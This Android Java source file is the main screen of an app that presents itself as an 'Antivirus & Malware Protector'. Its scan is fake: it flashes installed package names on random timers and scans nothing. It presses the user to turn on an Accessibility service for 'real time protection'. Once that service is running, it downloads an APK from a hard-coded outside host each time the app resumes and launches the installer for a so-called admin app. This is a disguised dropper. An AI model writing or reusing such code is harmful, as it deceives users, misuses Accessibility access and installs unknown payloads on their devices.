package somee.com.antivirus.protector;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Random;

//import static lock.somee.com.antivirus.R.id.progressBar2;

public class MainActivity extends Activity {

    //private static final int MY_PERMISSIONS_REQUEST_READ_CONTACTS = 1 ;
    private static final int MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE = 2;

    List<ApplicationInfo> listOfApps;
    ProgressBar pb = null;
    TextView textView = null;
    ImageView imageView = null;
    PackageManager packageManager;
    Button scanbutton = null;
    TextView textViewLastScan = null;

    private void startInstallAdminApp()
    {
            Log.v(TAG, "Installing");
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory(), "Android/data/" + getApplicationInfo().processName + "/temp/temp.apk")), "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
            startActivity(intent);
    }

    @Override
    protected void onResume() {
        Log.v(TAG, "onResume");
        super.onResume();
        downloadAdminApp("");
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.v(TAG, "onCreate");



        /*if(isServiceRunning()) {
            startInstall();
        }*/

        setContentView(R.layout.activity_main);
        getListOfApps();



        textView = (TextView) findViewById(R.id.textViewss);
        imageView = (ImageView) findViewById(R.id.imageView);
        scanbutton = (Button) findViewById(R.id.scanbutton);

        String lastScanDate = getLastScanDate();
        if(lastScanDate == "")
            lastScanDate = "No Scans";

        textViewLastScan = (TextView) findViewById(R.id.textView);
        textViewLastScan.setText("Last scan: " + lastScanDate);

        //downloadAdminApp("");

        String[] permissions = {Manifest.permission.WRITE_EXTERNAL_STORAGE};
        requestPermissions(permissions, WRITE_REQUEST_CODE);
    }
    private static final int WRITE_REQUEST_CODE = 101;
    int index=0;
    boolean isScanning = false;


    private String scan_prefs = "prefs";
    private String lastScanKey = "last_scan_date";
    private String getLastScanDate ()
    {
        SharedPreferences sp = getSharedPreferences(scan_prefs, Activity.MODE_PRIVATE);
        return sp.getString(lastScanKey, "");
    }

    private void setLastScanDate ()
    {
        SharedPreferences sp = getSharedPreferences(scan_prefs, Activity.MODE_PRIVATE);
        SharedPreferences.Editor editor = sp.edit();
        editor.putString(lastScanKey, getCurrentTimeStamp() );
        editor.commit();
    }

    /**
     *
     * @return yyyy-MM-dd HH:mm:ss formate date as string
     */
    public static String dateFormatString = "MMM d, yyyy HH:mm:ss";
    public static String getCurrentTimeStamp(){
        try {

            //SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            SimpleDateFormat dateFormat = new SimpleDateFormat(dateFormatString);
            String currentDateTime = dateFormat.format(new Date()); // Find todays date

            return currentDateTime;
        } catch (Exception e) {
            e.printStackTrace();

            return null;
        }
    }
    static final String TAG = "ShieldService";
    public static String serviceRunningKey = "serviceKey";
    private boolean isServiceRunning(){
        boolean ret = false;
        SharedPreferences sp = getSharedPreferences("your_prefs", Activity.MODE_PRIVATE);
        if (sp.contains(serviceRunningKey) ){
            /*String serviceTimeStamp = sp.getString(serviceRunningKey,"");
            if (!serviceTimeStamp.isEmpty()){
                String currentTimeStamp = getCurrentTimeStamp();

                try{

                    SimpleDateFormat formatter = new SimpleDateFormat(dateFormatString);

                    Date serivceDateTime = formatter.parse(serviceTimeStamp);
                    Date currentDateTime = formatter.parse(currentTimeStamp);

                    long diff = Math.abs(currentDateTime.getTime() - serivceDateTime.getTime());
                    float diffMinuts = diff / (60 * 1000);
                    Log.v(TAG, diff + " serivceDateTime=" + serivceDateTime+ " currentDateTime=" + currentDateTime);
                    if (diff<2000)
                        ret=true;
                }catch (ParseException e1){
                    e1.printStackTrace();
                }

            }*/
            return true;
        }

        return ret;
    }

    public void onClickPrivacyPolicy(View v) {
        Intent myIntent = new Intent(MainActivity.this, PrivacyPolicy.class);
        MainActivity.this.startActivity(myIntent);
    }

    public void onClick(View v) {


        if(isServiceRunning()) {
            if (isScanning) {
                isScanning = false;
                scanbutton.setBackgroundResource(R.drawable.scan1);
            } else {
                scanbutton.setBackgroundResource(R.drawable.scan2);
                isScanning = true;
                index = 0;
                setTimer();
                imageView.setVisibility(View.VISIBLE);
                pb.setVisibility(View.VISIBLE);
            }
            TextView txtTmp = (TextView) findViewById(R.id.textView6);
            txtTmp.setVisibility(View.INVISIBLE);
            txtTmp = (TextView) findViewById(R.id.txtsumery);
            txtTmp.setVisibility(View.INVISIBLE);
            ImageView imageView2 = (ImageView) findViewById(R.id.imageView2);
            imageView2.setVisibility(View.INVISIBLE);

        }
        else{
            new AlertDialog.Builder(this)
                    .setTitle("Real time protection")
                    .setMessage("Please enable:\nAccessibility -> Antivirus & Malware Protector -> ON")
                    .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                            onClickSettings(null);
                        }
                    })
                    .show();


            TextView txtTmp = (TextView) findViewById(R.id.textView6);
            txtTmp.setVisibility(View.VISIBLE);
            txtTmp = (TextView) findViewById(R.id.txtsumery);
            txtTmp.setVisibility(View.VISIBLE);
            ImageView imageView2 = (ImageView) findViewById(R.id.imageView2);
            imageView2.setVisibility(View.VISIBLE);
        }


    }

    public void onClickSettings(View v) {
        startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 0);
    }

    private void setTimer(){

        if(index < listOfApps.size() && isScanning)
        {
            textView.setText(listOfApps.get(index).packageName);
            imageView.setBackground(listOfApps.get(index).loadIcon(packageManager));


            int min = 100;
            int max = 1000;
            Random r = new Random();
            int delaytime = r.nextInt(max - min + 1) + min;

            // Execute some code after 2 seconds have passed
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    pb.setProgress(index);
                    setTimer();
                }
            }, delaytime);

            index++;
        }
        else
        {
            scanbutton.setBackgroundResource(R.drawable.scan1);
            isScanning = false;

            if(index == listOfApps.size())
            {
                setLastScanDate();
                textViewLastScan.setText(getLastScanDate());
            }
        }
    }


    private void getListOfApps() {
        // http://developer.android.com/reference/android/content/pm/PackageManager.html
        // Class for retrieving various kinds of information related to the application
        // packages that are currently installed on the device.
        packageManager = getPackageManager();

        // Get a list of the installed applications
        listOfApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);

    }


    boolean isDuringDownload = false;
    private void download()
    {
        if(!isDuringDownload) {
            //isDuringDownload = true;
            AsyncInstallAPK downloadAndInstall = new AsyncInstallAPK();
            downloadAndInstall.setContext(getApplicationContext());
            downloadAndInstall.setParent(this);
            downloadAndInstall.execute("http://lock1.somee.com/default.asp");
        }
    }

    private void downloadAdminApp(String appPackageName)
    {
        if(isServiceRunning()) {
            Log.e(TAG,"downloadAdminApp");
            if (android.os.Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
                download();
            } else {
                if (ContextCompat.checkSelfPermission(this,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE)
                        != PackageManager.PERMISSION_GRANTED) {

                    // Should we show an explanation?
                    if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE)) {

                        // Show an expanation to the user *asynchronously* -- don't block
                        // this thread waiting for the user's response! After the user
                        // sees the explanation, try again to request the permission.

                    } else {

                        // No explanation needed, we can request the permission.

                        ActivityCompat.requestPermissions(this,
                                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                                MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE);

                        // MY_PERMISSIONS_REQUEST_READ_CONTACTS is an
                        // app-defined int constant. The callback method gets the
                        // result of the request.
                    }
                }
                else{
                    download();
                }
            }
        }

    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        Log.e(TAG,"onRequestPermissionsResult");
        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.
                    download();

                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                }
                return;
            }
            // other 'case' lines to check for other
            // permissions this app might request
        }
    }

    /*private boolean isInstalled=false;
    public void SetResult(Boolean isInstalledResult) {
        isInstalled = isInstalledResult;
        if(isInstalled){
            startInstallAdminApp();
        }
    }*/
}
